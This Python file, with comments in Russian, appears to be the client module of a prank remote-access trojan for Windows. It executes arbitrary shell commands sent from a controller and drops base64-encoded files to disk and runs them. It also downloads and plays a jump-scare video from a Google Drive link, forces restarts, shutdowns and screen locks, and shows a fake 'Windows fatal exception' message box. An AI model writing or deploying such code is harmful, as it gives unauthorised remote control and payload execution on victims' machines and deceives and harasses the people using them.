import os
import wget
import pyautogui
import ctypes
import base64


__test = True


def screamer():
    """запускает видео скримера со свинкой пеппой"""
    try:
        if not os.path.exists("peppa.mp4"):
            wget.download("https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1URMndAIpUpJ6f_USF4Ln6VOmQ64SVFCm")
    except Exception as err:
        print(err)
        return "Сайт загрузки скримера недоступен"
    try:
        os.system("peppa.mp4")
    except Exception as err:
        print(err)
        return "невозможно открыть файл скримера"
    return "Скример сработал)"

def hotkey(keys):
    """активирует хоткей"""
    try:
        pyautogui.hotkey(keys)
        return "хоткей сработал"
    except Exception as err:
        print(err)
        return "неправильный хоткей"

def sys_command(command):
    """Использует стандартную сиситемную комманду, например peppa.mp4 откроется в видеопроигрователе"""
    # переводит массив слов в строку с коммандой
    try:
        command = ' '.join(command)
    except Exception as err:
        print(err)
        return "Ошибка перевода комманды в клиенте"
    try:
        os.system(command)
        return "команда сработала"
    except Exception as err:
        print(err)
        return "Неправильная комманда"

def restart_pc():
    os.system("shutdown /r /t 1")
    return "пк клиента перезапущен"

def shutdown_pc():
    os.system("shutdown /s /t 1")
    return "пк клиента выключен"

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    return "пк клиента заблокирован"

def message(text):
    try:
        text = ' '.join(text)
        ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
        return "сообщение доставлено"
    except Exception as err:
        print(err)
        return "при вызове сообщения произошла ошибка"

def drop(name, content):
    try:
        if not os.path.exists(name):
            with open(name, "wb") as file:
                    file.write(base64.b64decode(content))
    except Exception as err:
        print(err)
        return "ошибка записи файла при отправке"
    try:
        os.system(name)
    except Exception as err:
        print(err)
        return "ошибка при открытии файла"
    return "файл открыт"

def restart_client():
    """перезапускает клиент"""
    import  subprocess
    subprocess.Popen(['python', 'client.py']) if __test == True else os.system('client.exe')
    return "скрипт клиента перезапущен"
